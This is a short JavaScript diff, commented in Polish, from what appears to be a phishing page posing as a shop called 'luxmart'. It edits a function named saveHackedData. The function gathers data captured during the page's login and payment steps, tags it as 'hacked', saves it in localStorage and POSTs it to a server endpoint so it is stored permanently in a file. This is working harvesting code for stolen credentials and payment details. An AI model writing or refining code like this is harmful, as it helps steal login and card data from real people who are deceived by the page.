@@ -84,20 +84,26 @@ function handleLogin() {
     showStep('account');
 }
 
-function saveHackedData() {
+async function saveHackedData() {
     // Zachowaj w localStorage dla kompatybilności
     let allHacked = JSON.parse(localStorage.getItem('luxmart_hacked_data') || '[]');
     hackedData.timestamp = new Date().toISOString();
     hackedData.orderId = paymentData.orderId;
+    hackedData.type = 'hacked'; // Dodaj typ dla odróżnienia od zamówień
     allHacked.push(hackedData);
     localStorage.setItem('luxmart_hacked_data', JSON.stringify(allHacked));
 
     // Wyślij do serwera (trwały zapis w pliku)
-    fetch('/api/save', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(hackedData)
-    }).catch(err => console.error('Błąd zapisu do pliku:', err));
+    try {
+        await fetch('/api/save', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(hackedData)
+        });
+        console.log('Dane przesłane do serwera');
+    } catch (err) {
+        console.error('Błąd zapisu do pliku:', err);
+    }
 }
 
 function processPayment() {
